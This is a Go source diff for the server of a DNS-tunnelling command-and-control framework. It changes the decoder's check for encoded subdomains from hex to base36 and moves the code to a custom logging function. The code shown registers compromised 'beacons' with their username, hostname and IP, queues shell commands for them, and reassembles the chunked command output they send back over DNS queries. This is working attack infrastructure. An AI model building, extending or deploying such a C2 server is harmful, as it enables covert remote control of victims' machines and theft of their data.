@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"log"
 	"strconv"
 	"strings"
 	"sync"
@@ -121,40 +120,57 @@ func isLegitimateSubdomain(subdomain string) bool {
 		return true
 	}
 
-	// If subdomain contains only letters and numbers with dashes (no hex-like pattern)
+	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
 	// and is reasonably short, it's probably legitimate
-	if len(subdomain) <= 20 && !looksLikeHex(subdomain) {
+	if len(subdomain) <= 20 && !looksLikeBase36(subdomain) {
 		return true
 	}
 
 	return false
 }
 
-// looksLikeHex checks if a string looks like hex-encoded data
-func looksLikeHex(s string) bool {
+// looksLikeBase36 checks if a string looks like base36-encoded C2 data
+func looksLikeBase36(s string) bool {
 	// Remove any dots (from split labels)
 	clean := strings.ReplaceAll(s, ".", "")
 
-	// Must be even length for valid hex
-	if len(clean)%2 != 0 {
+	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
+	if len(clean) < 30 {
 		return false
 	}
 
-	// Must be reasonably long to be encoded data
-	if len(clean) < 20 {
-		return false
-	}
-
-	// Check if all characters are hex digits
+	// Check if all characters are valid base36 digits (0-9, a-z)
 	for _, char := range clean {
 		if !((char >= '0' && char <= '9') ||
-			(char >= 'a' && char <= 'f') ||
-			(char >= 'A' && char <= 'F')) {
+			(char >= 'a' && char <= 'z')) {
 			return false
 		}
 	}
 
-	return true
+	// Additional heuristics for base36 encoded data:
+	// - Very long strings are likely encoded data
+	// - High entropy (good mix of numbers and letters) suggests encoding
+	if len(clean) > 50 {
+		return true
+	}
+
+	// Check for good entropy (mix of numbers and letters)
+	hasNumbers := false
+	hasLetters := false
+	for _, char := range clean {
+		if char >= '0' && char <= '9' {
+			hasNumbers = true
+		}
+		if char >= 'a' && char <= 'z' {
+			hasLetters = true
+		}
+		if hasNumbers && hasLetters {
+			break
+		}
+	}
+
+	// If it has both numbers and letters and is reasonably long, it's likely base36 data
+	return hasNumbers && hasLetters && len(clean) >= 30
 }
 
 // processBeaconQuery processes a DNS query from a beacon and returns appropriate response
@@ -253,7 +269,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		return c2.handleChunk(parts), true
 
 	default:
-		log.Printf("[C2] Unknown message type: %s", messageType)
+		logf("[C2] Unknown message type: %s", messageType)
 		return "", false
 	}
 }
@@ -279,7 +295,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
 		}
 		c2.beacons[beaconID] = beacon
 		// Always log new beacon registration
-		log.Printf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
+		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
 	}
 
 	// Update beacon info
@@ -292,7 +308,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
 
 	// Only log checkins in debug mode to keep console clean
 	if c2.debug {
-		log.Printf("[C2] Checkin: %s (%s@%s) from %s",
+		logf("[C2] Checkin: %s (%s@%s) from %s",
 			beaconID, username, hostname, clientIP)
 	}
 
@@ -309,7 +325,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string) string {
 		}
 
 		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
-		log.Printf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
+		logf("[C2] Task %s → %s: %s", task.ID, beaconID, task.Command)
 		return taskResponse
 	}
 
@@ -331,14 +347,14 @@ func (c2 *C2Manager) handleResult(parts []string) string {
 	if len(preview) > 200 {
 		preview = preview[:200] + "..."
 	}
-	log.Printf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)
+	logf("[C2] Received RESULT from %s for %s (%d bytes). Preview: %s", beaconID, taskID, len(result), preview)
 
 	// Update task with result
 	if task, exists := c2.tasks[taskID]; exists {
 		task.Result = result
 		task.Status = "completed"
 	} else {
-		log.Printf("[C2] Warning: Result received for unknown task %s (beacon %s)", taskID, beaconID)
+		logf("[C2] Warning: Result received for unknown task %s (beacon %s)", taskID, beaconID)
 	}
 
 	return "ACK"
@@ -378,7 +394,7 @@ func (c2 *C2Manager) handleChunk(parts []string) string {
 		if task, exists := c2.tasks[taskID]; exists {
 			task.Result = result
 			task.Status = "completed"
-			log.Printf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
+			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), totalChunks)
 		}
 
 		// Clean up chunks
@@ -412,7 +428,7 @@ func (c2 *C2Manager) handleResultMeta(parts []string) string {
 	totalSize, _ := strconv.Atoi(parts[3])
 	totalChunks, _ := strconv.Atoi(parts[4])
 
-	log.Printf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
+	logf("[C2] Expecting chunked result from %s for %s: %d bytes in %d chunks",
 		beaconID, taskID, totalSize, totalChunks)
 
 	// Store the expectation
@@ -443,7 +459,7 @@ func (c2 *C2Manager) handleData(parts []string) string {
 	// Check if we're expecting this data
 	expected, exists := c2.expectedResults[taskID]
 	if !exists {
-		log.Printf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
+		logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
 		return "ERROR"
 	}
 
@@ -451,7 +467,7 @@ func (c2 *C2Manager) handleData(parts []string) string {
 	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
 		expected.ReceivedData[chunkIndex-1] = data
 	} else {
-		log.Printf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
+		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
 			chunkIndex, taskID, expected.TotalChunks)
 		return "ERROR"
 	}
@@ -471,7 +487,7 @@ func (c2 *C2Manager) handleData(parts []string) string {
 		// Reconstruct the complete result
 		result := strings.Join(expected.ReceivedData, "")
 
-		log.Printf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
+		logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
 
 		// Update the task
 		if task, exists := c2.tasks[taskID]; exists {
@@ -508,11 +524,11 @@ func (c2 *C2Manager) AddTask(beaconID, command string) string {
 	// Add to beacon's task queue
 	if beacon, exists := c2.beacons[beaconID]; exists {
 		beacon.TaskQueue = append(beacon.TaskQueue, *task)
-		log.Printf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
+		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
 		return taskID
 	}
 
-	log.Printf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
+	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
 	return ""
 }
 
